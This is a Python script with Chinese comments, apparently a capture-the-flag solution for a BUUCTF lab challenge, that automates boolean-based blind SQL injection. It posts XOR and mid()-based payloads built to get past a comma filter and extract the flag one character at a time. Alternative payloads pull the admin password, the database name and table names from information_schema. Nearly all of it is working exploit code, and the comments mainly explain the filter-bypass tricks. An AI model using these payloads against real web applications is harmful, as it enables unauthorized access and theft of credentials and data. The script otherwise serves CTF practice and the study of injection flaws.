#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。
import requests
import string,hashlib
url = 'http://2b6684fa-1864-40ac-b79a-cc5809868056.node4.buuoj.cn:81/index.php'
sss = string.digits + (string.ascii_lowercase)
a = ''
for i in range(1, 50):
    flag = 0
    for j in sss:
        payload = "1^((ascii(mid((select(flag)from(flag))from(%s))))<>%s)^1" % (i, ord(j))
        #屏蔽了","，改用mid()函数，from表示起始位置
        #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit
        #<>表示不等号
        #^表示异或
        #payload1 = "1^(substr())" % (i, ord(j))
        payload2= "admin123'or((ascii(mid((select(password)from(admin))from(%s))))<>%s)#"%(i,ord(j))
        #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔
        payload3= "admin123'or((ascii(mid((select(database()))from(%s))))<>%s)#"%(i,ord(j))
        #payload3= "admin123'or((ascii(mid((select(table_name)from(information_schema.tables)where(table_schema=database()) limit %s,1)from(%s))))<>%s)#"%(i,ord(j))
        #可选择playload
        data = {'id': payload}#, 'password': 'admin'}
        res = requests.post(url, data=data).text
        if 'hello' in res:
            a += j
            flag = 1
            print(a)
            break
    if flag == 0:
        break
 
print(a)
